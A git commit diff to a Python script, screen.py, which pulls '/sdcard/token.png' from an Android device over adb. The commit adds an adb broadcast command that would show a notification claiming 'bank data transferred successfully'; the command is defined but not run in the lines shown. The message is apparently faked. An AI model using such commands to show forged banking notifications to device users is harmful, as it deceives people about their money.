cb11160929dbb9bb21115a6b1778995224e1f3cc
Vyerz23 <lionman2301@gmail.com>
2024-06-01 10:48:06 -0300

    a8

--- screen.py
+++ screen.py
@@ -8,4 +8,8 @@ def take_screenshot():
     command = ["adb", "pull", "/sdcard/token.png", "."]
     subprocess.run(command)
 
+    # Enviar el comando para mostrar una notificación
+    command = ["adb", "shell", 'am broadcast -a com.example.yourapp.SHOW_NOTIFICATION -e title "Operación exitosa." -e message "Datos bancarios transferidos con éxito."']
+    #adb_device.shell('am broadcast -a com.example.yourapp.SHOW_NOTIFICATION -e title "Title" -e message "Message"')
+
     print("Captura de pantalla tomada y guardada como 'screenshot.png'")
